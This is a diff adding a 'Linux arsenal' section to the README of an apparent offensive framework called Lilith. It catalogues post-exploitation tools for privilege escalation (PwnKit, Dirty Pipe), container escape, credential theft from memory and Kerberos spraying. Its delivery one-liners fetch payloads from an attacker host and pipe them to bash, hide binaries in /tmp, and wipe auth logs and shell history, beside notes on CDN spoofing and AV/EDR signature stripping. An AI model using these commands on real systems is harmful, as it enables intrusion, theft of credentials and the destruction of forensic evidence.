@@ -1240,6 +1240,77 @@ Commands are mapped to ATT&CK techniques at dispatch time. Examples:
 
 ---
 
+## Linux arsenal
+
+Lilith serves Linux post-exploitation tools directly from `linux/` — same CDN-spoofed HTTPS server used for Windows payloads. Drop any binary or script into `linux/` and it becomes available immediately.
+
+### Setup
+
+```bash
+# Binaries live here — gitignored, user-supplied
+ls linux/
+
+# List catalog with ✓/✗ availability and curl one-liners
+lilith linux
+lilith linux --lhost 10.10.14.1       # embed LHOST in one-liners
+lilith linux --cat privesc             # filter by category
+```
+
+### Tool catalog
+
+| Tool | Category | Description |
+|---|---|---|
+| `linpeas.sh` | recon | Full host enum — color-coded by exploit probability |
+| `pspy64` / `pspy32` | recon | Process/cron snoop without root (inotify-based) |
+| `linux-exploit-suggester.sh` | privesc | Kernel version → CVE mapper with runtime sysctl checks |
+| `traitor-amd64` | privesc | Auto-exploits GTFOBins + Dirty Pipe (CVE-2022-0847) + PwnKit (CVE-2021-4034) |
+| `cve-2021-4034` | privesc | PwnKit — polkit pkexec LPE → root (universal Linux) |
+| `deepce.sh` | container | Docker escape: socket abuse, caps, cgroup-v1, volume mounts |
+| `cdk_linux_amd64` | container | K8s + Docker escape — CVE-2024-21626 (Leaky Vessels), runc, token steal |
+| `mimipenguin.sh` | creds | Cleartext creds from memory: GDM, gnome-keyring, sshd, vsftpd |
+| `kerbrute_linux_amd64` | lateral | Kerberos enum/spray from Linux |
+| `socat` | lateral | Static socat — port relay, reverse shells, TLS tunnels |
+| `ncat` | lateral | Static ncat — connect-back, port forward, SSL |
+| `log-killer.sh` | evasion | Wipe wtmp, btmp, lastlog, auth.log, bash_history; scrub by IP |
+
+### Delivery one-liners
+
+```bash
+# Full enum (pipe to bash — no file on disk)
+curl -sk https://LHOST/linpeas.sh | bash
+
+# Process snoop (background)
+curl -sk https://LHOST/pspy64 -o /tmp/.ps && chmod +x /tmp/.ps && /tmp/.ps &
+
+# Auto privesc (Dirty Pipe / PwnKit / GTFOBins)
+curl -sk https://LHOST/traitor-amd64 -o /tmp/.tr && chmod +x /tmp/.tr && /tmp/.tr -p
+
+# Container escape (auto-detect + exploit)
+curl -sk https://LHOST/cdk_linux_amd64 -o /tmp/.cdk && chmod +x /tmp/.cdk && /tmp/.cdk run auto-escape
+
+# Kerberoast from Linux
+curl -sk https://LHOST/kerbrute_linux_amd64 -o /tmp/.kb && chmod +x /tmp/.kb
+./tmp/.kb userenum -d corp.local /usr/share/wordlists/users.txt --dc 10.10.10.10
+
+# Log cleanup (wipe all auth trails)
+curl -sk https://LHOST/log-killer.sh | bash
+# or with IP scrub:
+curl -sk https://LHOST/log-killer.sh | bash -s -- 10.10.14.1
+```
+
+### Populating the arsenal
+
+Tools not included (no static Linux build available):
+
+| Tool | How to add |
+|---|---|
+| `gtfo` | `go install github.com/mzfr/gtfo@latest && cp ~/go/bin/gtfo linux/` |
+| `lazagne` | Python only — `curl -sk https://LHOST/lazagne.py \| python3` if Python3 on target |
+
+Any binary or script placed in `linux/` is served immediately — no restart needed.
+
+---
+
 ## Static signature eradicator
 
 Every `.exe` in the tool catalog is automatically stripped of static AV/EDR signatures before encoding — no manual intervention needed. The eradicator runs inside `build --tool` and `build --tools` / `build --all`.
